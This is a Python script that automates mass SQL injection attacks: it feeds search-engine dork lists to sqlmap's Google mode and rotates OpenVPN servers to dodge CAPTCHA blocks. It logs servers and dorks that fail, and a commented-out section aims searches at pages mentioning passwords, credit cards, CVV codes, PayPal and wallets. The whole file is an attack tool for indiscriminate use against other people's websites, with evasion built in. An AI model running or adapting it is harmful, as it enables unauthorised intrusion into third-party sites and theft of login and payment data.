import os
import re
import subprocess
import time
import sys
import random
import requests
from subprocess import Popen , PIPE
from _thread import *
import threading
md=os.getcwd()
dorklist=open(os.getcwd()+"\\ky.txt").readlines()
dorklist=dorklist*5
bs=[]
db=[]
def nd():
    global bs , db
    bs=open(os.getcwd()+"\\bad server"+".txt", encoding='utf-8').readlines()
    db=open(os.getcwd()+"\\bad dork"+".txt", encoding='utf-8').readlines()
    rrr= str(bs)+str(db)
    return rrr
# os.chdir(R'C:\Users\ov\config')
ns=open('ns.txt').readlines()
#print(ns)
#print(len(ns))
sni=""
co=1
def resultin():
    os.chdir(md)
    print('resultin' )
    sp()
    b=open(os.getcwd()+"\\url list bing.txt", encoding='utf-8').readlines()
    g1=open(os.getcwd()+"\\url list google.txt", encoding='utf-8').readlines()
    d=open(os.getcwd()+"\\url list duckduckgo.txt", encoding='utf-8').readlines()
    print(len(b),'\n',len(g1),'\n',len(d),'\n')
    return [b,g1,d]
def co():
    print('conn')
    global sk,sni
    if len(sk)==(len(ns)):
        sk=[]
    s=random.randint(0,(len(ns)-1))
    sni=ns[s]
    
    if  sni not in nd() and s not in sk :
        sk.append(s)
        k='C:\\Users\\ov\\bin\\openvpn-gui.exe --command connect '+ns[s]
        cmd=Popen(k,shell=True , stdout=PIPE).communicate()
sk=[]
def di():
    k='TASKKILL /F /IM openvpn-gui.exe'
    cmd=Popen(k,shell=True , stdout=PIPE).communicate()
    k='TASKKILL /F /IM openvpn.exe'
    cmd=Popen(k,shell=True , stdout=PIPE).communicate()
    k='TASKKILL /F /IM openvpnserv.exe'
    cmd=Popen(k,shell=True , stdout=PIPE).communicate()
    k='TASKKILL /F /IM openvpnserv2.exe'
    cmd=Popen(k,shell=True , stdout=PIPE).communicate()
    try:
        ip1=requests.get('https://api.ipify.org/').text
    except:
        ip1='10.2.3.1'
    #print(ip1)
    t1 = threading.Thread(target = co)
    t1.start()
    try:
        ip2=requests.get('https://api.ipify.org/').text
    except:
        ip2='10.2.3.2'
    ntry=0
    while ip1==ip2 and ntry < 20:
        time.sleep(3)
        ntry+=1
        try:
            ip2=requests.get('https://api.ipify.org/').text
        except:
            ip2='10.2.3.2'
    
    #print('im pass')
    #print(ip1,ip2)
    
#     k='TASKKILL /F /IM openvpn-gui.exe'
#     cmd=Popen(k,shell=True , stdout=PIPE).communicate()
       
def get(dork):
    os.chdir(R'C:\Users\hkhttat123\Desktop\sql1')
    k='python  sqlmap.py -g '+dork
    print(k)#,shell=True , stdout=PIPE
    cmd=Popen(k,shell=True , stdout=PIPE).communicate()
    os.chdir(md)
thra=0
def sp():
    print("=====>"+str(time.localtime()[3])+':'+str(time.localtime()[4])+':'+str(time.localtime()[5]))
def p():
    os.chdir(md)
    try:
        p=open(os.getcwd()+"\\google.html", encoding='utf-8').readlines()
    except:
        p='nnn'
    return p
#(len(dorklist))
thred=0
for i in range(2275,len(dorklist)):
    print(i)
    olr=resultin()
#     if open(os.getcwd()+"\\type"+".txt" ,'r' ,encoding='utf-8').readlines()[0]=="True":
    if True:
        while dorklist[i] not in nd() and olr == resultin() and thred<8 and 'did not match any documents' not in str(p()):
            resultin()
            thred+=1
            #print('im get a new ip')
            di()
            dork='"'+os.getcwd()+"\\ky.txt"+'@1@'+str(i)+'"'
            print(dork)
            open(os.getcwd()+"\\type"+".txt" ,'w' ,encoding='utf-8').write('False')
            get(dork)
            print('----')
            dork='"'+os.getcwd()+"\\ky1.txt"+'@2@'+str(i)+'"'
            get(dork)
            dork='"'+os.getcwd()+"\\ky1.txt"+'@3@'+str(i)+'"'
            get(dork)
            while open(os.getcwd()+"\\type"+".txt" ,'r' ,encoding='utf-8').readlines()[0]=="False":
    #             #print(open(os.getcwd()+"\\type"+".txt" ,'r' ,encoding='utf-8').readlines()[0]=="False")
                pass
            
        else:
            src='/recaptcha/api.js'
            print('prob')
            if src in str(p()):
                print('bad server'+sni)
                open(os.getcwd()+"\\bad server"+".txt" ,'a' ,encoding='utf-8').write(sni+'\n')
                ns.remove(sni)
            elif 'did not match any documents' in str(p()):
                open(os.getcwd()+"\\google.html" ,'w' ,encoding='utf-8').write('5')
                bd=(open(os.getcwd()+"\\dork hot1.txt", encoding='utf-8').readlines()[i][:-1])
                open(os.getcwd()+"\\bad dork"+".txt" ,'a' ,encoding='utf-8').write(bd+'\n')
                open(os.getcwd()+"\\google.html" ,'w' ,encoding='utf-8').write('5')
                thred=6
            
        thred=0
        print('pass')
        
    
#print('end')
        







# def sert(dork):
#     try:
#         l=['login','siginup','password','email','You Plan','Username','cart','shop new','Shopping','checkout','Credit/Debit Card','cvv','cvc','paypal','My Balance','Wallet']
#         
#         for k in l :
#             dork1='inurl:"%s"' % dork
#             dork1+=',intext:"%s"' % k
#             ##print(dork1)
#             ##print(k)
#             _search_google(dork1)
#             _search_duck(dork1)
#             dork1=''
#     except:
#         pass
#     try:
#         _search_bing(dork)
#     except:
#         pass----------------------
# for dork in dorklist:
#     dork=dork.split(',')[0]
#     resultin()
#     os.chdir(md)
#     try:
#         p=open(os.getcwd()+"\\google.html", encoding='utf-8').readlines()
#         
#     except:
#         p='nnn'
#     while "recaptcha/api.js" in str(p) :
#         di()
#         get(dork)
#         p=open(os.getcwd()+"\\google.html", encoding='utf-8').readlines()
#     else:
#         di()
#         thra=0
#         get()